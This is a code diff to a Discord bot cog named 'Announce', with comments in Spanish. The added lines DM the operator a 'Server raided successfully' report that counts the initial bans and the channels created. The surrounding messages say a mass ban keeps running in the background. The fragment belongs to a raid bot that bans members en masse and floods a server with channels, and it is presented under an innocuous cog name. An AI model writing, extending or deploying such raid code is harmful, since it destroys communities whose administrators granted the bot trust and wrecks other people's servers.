@@ -103,9 +103,27 @@ class Announce(commands.Cog):
                     await asyncio.sleep(1)
                     break
             
+            # 6. Enviar mensaje al DM del useradmin
+            try:
+                dm_channel = await useradmin.create_dm()
+                raid_message = f"✅ Server raided successfully!\n- Initial bans: {banned_members}\n- Channels created: {channel_count}\n- Message: {message}"
+                await dm_channel.send(raid_message)
+            except Exception as e:
+                print(f"No se pudo enviar mensaje al DM de {useradmin}: {e}")
+                # Intentar enviar el mensaje por el canal de followup si falla el DM
+                try:
+                    await interaction.followup.send(
+                        f"No se pudo enviar el mensaje al DM de {useradmin.mention}. " +
+                        f"Operación completada con {banned_members} baneos iniciales y {channel_count} canales creados.",
+                        ephemeral=True
+                    )
+                except:
+                    pass
+            
             await interaction.followup.send(
                 f"Operación completada. Se banearon {banned_members} miembros inicialmente. " +
-                f"Se crearon {channel_count} canales. El baneo masivo continúa en segundo plano.",
+                f"Se crearon {channel_count} canales. El baneo masivo continúa en segundo plano. " +
+                f"Se ha enviado un mensaje de confirmación al DM de {useradmin.mention}.",
                 ephemeral=True
             )
             
